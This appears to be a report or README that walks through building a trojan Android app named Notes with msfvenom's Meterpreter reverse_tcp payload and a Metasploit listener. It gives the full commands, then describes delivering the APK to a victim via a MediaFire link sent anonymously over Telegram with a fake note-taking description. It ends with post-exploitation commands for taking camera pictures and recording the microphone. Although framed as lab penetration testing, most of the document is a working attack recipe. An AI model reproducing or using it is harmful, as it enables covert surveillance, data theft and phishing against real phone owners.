# Malicious App for Android

In this report, we have shown how we can hack an android mobile device using MSF
venom and the Metasploit framework. We will use MSF venom for generating the
payload, save it as an .apk file and set up a listener to the Metasploit framework. Once
the user/victim downloads and install the malicious .apk, an attacker can easily get back
the session on Metasploit. To accomplish this, an attacker needs to do some social
engineering to install the .apk on the victim’s mobile device.

The payload successfully penetrated the Android device using Kali Linux and penetration testing tools(Metasploit).
Successful creation and deployment of virus for android injected with payload in the form of an android app. With the help of our malicious .apk file (virus app for android) named Notes(apk).

Metasploit Framework--

* Metasploit is a penetration testing framework that makes hacking simple. It's an
essential tool for many attackers and defenders. Point Metasploit at your target,
pick an exploit, what payload to drop, and hit Enter.
* Better still, the core Metasploit Framework is both free and libre software and
comes pre-installed in Kali Linux. (It's BSD-licensed). The framework offers only a
command-line interface, but those wanting GUI-based click-and-drag hacking —
plus some other cool features — can drop a bundle for per-seat licenses
to Metasploit Pro.

Meterpreter--
* Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL
injection stagers and is extended over the network at runtime. It communicates over
the stager socket and provides a comprehensive client-side Ruby API. It features
command history, tab completion, channels, and more.
* Metepreter was originally written by skape for Metasploit 2.x, common extensions
were merged for 3.x and is currently undergoing an overhaul for Metasploit 3.3. The
server portion is implemented in plain C and is now compiled with MSVC, making it
somewhat portable. The client can be written in any language but Metasploit has a
full-featured Ruby client API.
* The target executes the initial stager. This is usually one of bind, reverse, findtag,
passivex, etc.
* The stager loads the DLL prefixed with Reflective. The Reflective stub handles the
loading/injection of the DLL.
* The Metepreter core initializes, establishes a TLS/1.0 link over the socket and sends a
GET. Metasploit receives this GET and configures the client.
* Lastly, Meterpreter loads extensions. It will always load stdapi and will load priv if the
module gives administrative rights. All of these extensions are loaded over TLS/1.0
using a TLV protocol.

Msfvenom--
* MSFvenom is used to make a payload to penetrate the Android emulator. Note: In
this command, we have used the local address because we are demonstrating in the
local environment. To perform in the public network, you should enter your public
address in LHOST and enable port forwarding on the router.
* Msfvenom is a command line instance of Metasploit that is used to generate and
output all of the various types of shell code that are available in Metasploit.
Reverse TCP Payload
* A reverse shell (also known as a connect-back) is the exact opposite: it requires the
attacker to set up a listener first on his box, the target machine acts as a client
connecting to that listener, and then finally the attacker receives the shell.
* It is a combination of MSFpayload and MSFencode. These tools are extremely useful for
generating payloads in various formats and encoding these payloads using various
encoder modules. 



What are we going to do?

* Using Metasploit Framework and MSF venom we are going to create a malicious .apk file.
* The .apk file will be having a particular payload and will have all file necessary to get access
to various features of the target device. 
* The .apk will be sent to the victim’s device using a
link which will automatically initiate the download of the the malicious .akp file into the
device. 
* The .apk will ask the victim for allowance of features on the device. After victim
grants the access to the app we can start our MSF console and initiate a meterpreter
session which will become a means of transfer for victims data to the hacker.
* After establishing a successful connection between the victim’s device and the hacker we
can accomplish huge number of tasks and gather enormous amount of victim’s data. 


How Are we going to do.
We will demonstrate this by using the following tools
* VirtualBox (virtual environment)
* Kali Linux
* Android device/emulator
We are using Kali Linux and an Android device to perform mobile penetration testing. Kali
Linux is one of the Debian-based operating systems with several tools aimed at various
information security tasks such as penetration testing, forensics and reverse engineering.
Kali Linux is one of the most-used operating systems for penetration testing. 
![image](https://user-images.githubusercontent.com/58047550/221257459-885a10aa-749e-450a-bb60-a619be90b6bb.png)




Step 1: Starting Kali Linux

•	From our VM, start Kali Linux and log in with our (user ID/password).
•	Open a terminal and switch user to root For this, we use the following command: Terminal: sudo su
And enter the user password.

•	After changing user to root in the terminal install apktool.
•	For this, we use the following command:
•	Terminal: apt-get install apktool
 

 

•	Now check your ip address using the command Terminal: ip r
•	This ip will be useful while assigning the localhost.

Step 2: After installing apktool make an exploit for the Android using the MSFvenom tool. For this, we use the following command:
Terminal: msfvenom -a java --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=8080 -o Notes.apk

APK file created successfully

Malicious .apk file ready to install
 

Step 3: The next step is to set up the listener on the Kali Linux machine with multi/handler payload using Metasploit.

For this, we use the following command: Terminal: msfconsole
 
 
Step 4:
Now we launch the exploit multi/handler and use the Android payload to listen to the clients.
Next commands used:
➢	msf6 > use exploit/multi/handler
➢	msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
➢	msf6 exploit(multi/handler) > set LHOST 192.168.1.103
➢	msf6 exploit(multi/handler) > set LPORT 8080
➢	msf6 exploit(multi/handler) > options
Next, set the options for payload, listener IP (LHOST) and listener PORT(LPORT). We have used localhost IP, port number 8080 and
payload android/meterpreter/reverse_tcp while creating an .apk file with MSFvenom.


























Type exploit -- Then we can successfully run the exploit to listen for the reverse connection.
 

Step 5:
Next, we need to install the malicious Android .apk file to the victim mobile device. Attacker can share a malicious Android .apk to the victim with the help of social engineering/email phishing.
At first we will try to generate a link for our .apk For this we will :
Goto mediafire website: https://app.mediafire.com/myfiles Next goto upload file.
 
And upload your apk file.
After uploading the malisious .apk file we will copy the link for the download page of our
.apk file.
Once we have generated the link for downloading our .apk file, we can send this link to the victim’s android device.
 

 



 

Step 6:
Next, we are going to download the file from link we have created on Kali Linux and will send this link to the victim account.
For this we have used telegram. We can change our identity to anonymous and can send this file link to the victim’s account. With the help of social enginnering we have made this app look like an app to take notes on your android and we have mentioned its product description. This makes it look like an attractive app and the victim might not hesitate in trying to download this app and use this app.
We have opened Telegram web on our browser in kali. Now we can easily send the link and our description about the app to the victim.



Step 7:
All screenshot mentioned below are of the victim’s android device. This is the victim’s device.
Victim open telegram and click on this link for the app.
 

 


■	As the victim clicks on this link to take a look at the app.
 

 





■	The victim is taken to the mediafire website page which consists the file download option.


■	As the user clicks on the download option the file starts downloading.
 

 

The victim has Downloaded the file into the Android device Now victim runs and install the .apk file.
■	Once the .apk fil is downloaded the user is redirected to the installation page.
 

 

Step 8:
■	The app asks for permissions to access the features on the victim’s android device.
 

 
■	Installing the application into an Android device

■	Once the user allows the app to access the features and click on install.
 

■	Android starts the installation of the app and once installed the user can see the app in the device named as MainActivity and can just click on the app to start using it.

■	After complete installation, we are going back to the Kali machine and start the Meterpreter session.
Step 9:
Going back to kali—
Once the user clicks on the app—our meterpreter session initiate and starts receiving data.

 

Successfully got the Meterpreter session
Once the meterpreter session starts we can just type “help” command to see the available option to execute in meterprreter.
With help command, we will see more options that we can perform with an Android device.

The commands are well categorized according to different domains.
 

 


Our first commmand will be “sysinfo”-
**sysinfo**
The ```sysinfo``` command shows you basic information about the Android device.
We got the Meterpreter session of the Android device. We can check more details with the sysinfo command, as mentioned in the below screenshot.
Next command—
**ifconfig**
The ```ifconfig``` command displays the network interfaces on the remote machine.
 

 

Display system details

 

Next command:
**getuid**
The ```getuid``` command shows the current user that the payload is running as: Next command:
**ps**
The ```ps``` command shows a list of processes the Android device is running. Next Command:
**webcam_list**
The ```webcam_list``` command shows a list of webcams you could use for the
```webcam_snap``` command. Next command:
**webcam_snap**
The ```webcam_snap``` command takes a picture from the device. You will have to use the
```webcam_list``` command to figure out which camera to use.

 

Next Command:
**record_mic**
The ```record_mic``` command records audio. Good for listening to a phone conversation, as well as other uses.



These are the files we got in our kali machine after executing the commands for camera (2 files .jpeg) and sound recording (1 file .wav).

To end the meterpreter session we can simply 
![image](https://user-images.githubusercontent.com/58047550/221258855-508b66f0-678e-4831-9293-deb97e2de1f4.png)
